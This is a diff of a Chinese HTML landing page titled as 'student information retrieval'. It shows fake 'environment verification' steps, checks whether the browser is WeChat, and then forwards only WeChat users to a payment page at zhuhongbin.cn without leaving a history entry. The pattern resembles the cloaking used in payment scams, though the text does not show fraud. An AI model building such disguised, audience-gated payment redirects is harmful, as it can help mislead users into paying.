@@ -1,44 +1,269 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>学生信息</title>
-  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>学生信息获取 - 跳转中</title>
     <style>
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            width: 100%; 
-            height: 100%; 
-            overflow: hidden; 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        iframe { 
-            width: 100%; 
-            height: 100vh; 
-            border: none; 
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #07c160;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        .status {
+            color: #666;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 14px;
+        }
+        
+        .loading {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #07c160;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        .wechat-tip {
+            background: #e6f7e6;
+            border: 1px solid #07c160;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .steps {
+            text-align: left;
+            margin: 20px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+        }
+        
+        .step-number {
+            width: 24px;
+            height: 24px;
+            background: #07c160;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-size: 12px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
- 
-    <iframe src="https://zhuhongbin.cn" 
-            sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"
-            style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none;">
-    </iframe>
-    
+    <div class="container">
+        <div class="logo">📚</div>
+        <h1>学生信息获取</h1>
+        
+        <div id="wechatCheck">
+            <div class="status">正在检测微信环境...</div>
+            <div class="loading"></div>
+            <p>请稍候，系统正在验证访问环境</p>
+        </div>
+        
+        <div id="wechatSuccess" class="hidden">
+            <div class="status" style="color: #07c160;">
+                ✓ 微信环境验证成功
+            </div>
+            <div class="wechat-tip">
+                <strong>检测到微信浏览器</strong>
+                <p>正在准备跳转到学习页面...</p>
+            </div>
+        </div>
+        
+        <div id="wechatFail" class="hidden">
+            <div class="status" style="color: #f5222d;">
+                ✗ 微信环境检测失败
+            </div>
+            <div class="wechat-tip">
+                <strong>请在微信中打开</strong>
+                <p>检测到当前不在微信环境中，请：</p>
+                <div class="steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <span>点击右上角菜单</span>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <span>选择"在浏览器打开"</span>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <span>选择"微信"</span>
+                    </div>
+                </div>
+            </div>
+            <button onclick="retryWechatCheck()" style="padding: 10px 20px; background: #07c160; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                重新检测
+            </button>
+        </div>
+        
+        <div id="redirecting" class="hidden">
+            <div class="status">正在跳转学习页面...</div>
+            <div class="loading"></div>
+            <p>请勿关闭页面，跳转完成后自动进入学习系统</p>
+        </div>
+    </div>
+
     <script>
-       
-        window.onload = function() {
-            const iframe = document.querySelector('iframe');
-            const currentUrl = new URL(window.location.href);
+        // 微信环境检测和跳转逻辑
+        function checkWechatEnvironment() {
+            const wechatCheck = document.getElementById('wechatCheck');
+            const wechatSuccess = document.getElementById('wechatSuccess');
+            const wechatFail = document.getElementById('wechatFail');
+            const redirecting = document.getElementById('redirecting');
             
-          
-            if (currentUrl.search) {
+            // 检测微信浏览器
+            const isWeixin = /MicroMessenger/i.test(navigator.userAgent);
+            
+            setTimeout(() => {
+                if (isWeixin) {
+                    // 微信环境检测成功
+                    wechatCheck.classList.add('hidden');
+                    wechatSuccess.classList.remove('hidden');
+                    
+                    // 2秒后开始跳转
+                    setTimeout(() => {
+                        wechatSuccess.classList.add('hidden');
+                        redirecting.classList.remove('hidden');
+                        
+                        // 执行最终跳转
+                        redirectToTargetPage();
+                    }, 2000);
+                    
+                } else {
+                    // 非微信环境
+                    wechatCheck.classList.add('hidden');
+                    wechatFail.classList.remove('hidden');
+                }
+            }, 1500);
+        }
+        
+        function redirectToTargetPage() {
+            // 获取URL参数
+            const urlParams = new URLSearchParams(window.location.search);
+            const packageParam = urlParams.get('p');
+            
+            if (packageParam) {
+                // 构建目标URL - 使用您提供的真实链接
+                const targetUrl = `http://zhuhongbin.cn/pay.html?p=${encodeURIComponent(packageParam)}`;
+                
+                console.log('跳转到目标页面:', targetUrl);
+                
+                // 使用replace方法跳转，不保留历史记录
                 setTimeout(() => {
-                    iframe.contentWindow.location.replace('https://zhuhongbin.cn' + currentUrl.pathname + currentUrl.search);
-                }, 100);
+                    try {
+                        window.location.replace(targetUrl);
+                    } catch (e) {
+                        // 如果replace失败，使用href跳转
+                        window.location.href = targetUrl;
+                    }
+                }, 1000);
+                
+            } else {
+                // 如果没有参数，显示错误
+                document.getElementById('redirecting').innerHTML = `
+                    <div class="status" style="color: #f5222d;">
+                        ✗ 跳转参数缺失
+                    </div>
+                    <p>缺少必要的跳转参数，请联系管理员</p>
+                    <button onclick="location.reload()" style="padding: 10px 20px; background: #1890ff; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;">
+                        重新加载
+                    </button>
+                `;
             }
-        };
+        }
+        
+        function retryWechatCheck() {
+            document.getElementById('wechatFail').classList.add('hidden');
+            document.getElementById('wechatCheck').classList.remove('hidden');
+            checkWechatEnvironment();
+        }
+        
+        // 添加微信JS-SDK支持（如果需要）
+        function loadWechatSDK() {
+            const script = document.createElement('script');
+            script.src = 'https://res.wx.qq.com/open/js/jweixin-1.6.0.js';
+            script.onload = function() {
+                console.log('微信JS-SDK加载完成');
+            };
+            document.head.appendChild(script);
+        }
+        
+        // 页面加载完成后开始检测
+        document.addEventListener('DOMContentLoaded', function() {
+            checkWechatEnvironment();
+            loadWechatSDK();
+        });
+        
+        // 处理页面可见性变化
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                console.log('页面回到前台，重新检查状态');
+            }
+        });
     </script>
 </body>
 </html>
